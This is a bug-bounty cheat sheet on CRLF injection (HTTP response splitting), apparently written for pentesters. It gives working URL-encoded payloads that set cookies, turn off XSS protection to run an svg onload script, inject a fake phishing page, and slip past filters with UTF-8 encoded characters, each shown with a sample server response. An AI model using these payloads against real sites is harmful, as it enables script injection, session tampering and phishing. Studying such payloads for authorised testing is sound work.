# CRLF
C → Carriage 

R → Return 

L  → Line

F  → Feed

the concept in this type of bug is you forge the request and customize it to cause an break and make new line and set a custom response from server.

alone CRLF has no impact at all although in pertest you have to report it.

you can use CRLF to leads the bellow bugs:

1-XSS(Reflected)

2-Open Redirect 

### the scenario

1. Add a fake HTTP response header: Content-Length: 0. This causes the
web browser to treat this as a terminated response and begin parsing a
new response.
2. Add a fake HTTP response: HTTP/1.1 200 OK. This begins the new response.
3. Add another fake HTTP response header: Content-Type: text/html. This is needed for the web browser to properly parse the content.
4. Add yet another fake HTTP response header: Content-Length: 25. This causes the web browser to only parse the next 25 bytes.
5. Add page content with an XSS: <script>alert(1)</script>. This content has exactly 25 bytes.
6. Because of the Content-Length header, the web browser ignores the original content that comes from the web server.

`http://www.example.com/somepage.php?page=
Content-Length: 0
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 25
<script>alert(1)</script>`

decoded:

`http://www.example.com/somepage.php?page=`
`Content-Length: 0`

`HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 25`

`<script>alert(1)</script>`

## CRLF - Add a cookie

Requested page

```
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

HTTP Response

```
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
```

## CRLF - Add a cookie - XSS Bypass

Requested page

```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

HTTP Response

```
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

## CRLF - Write HTML

Requested page

```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

HTTP response

```
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

		<html>You have been Phished</html>
```

## CRLF - Filter Bypass

Using UTF-8 encoding

```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

Remainder:

- %E5%98%8A = %0A = \u560a
- %E5%98%8D = %0D = \u560d
- %E5%98%BE = %3E = \u563e (>)
- %E5%98%BC = %3C = \u563c (<)

## Exploitation Tricks

- Try to search for parameters that lead to redirects and fuzz them
- Also test the mobile version of the website, sometimes it is different or uses a different backend

check for more [https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/tree/main/CRLF injection](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/tree/main/CRLF%20injection)
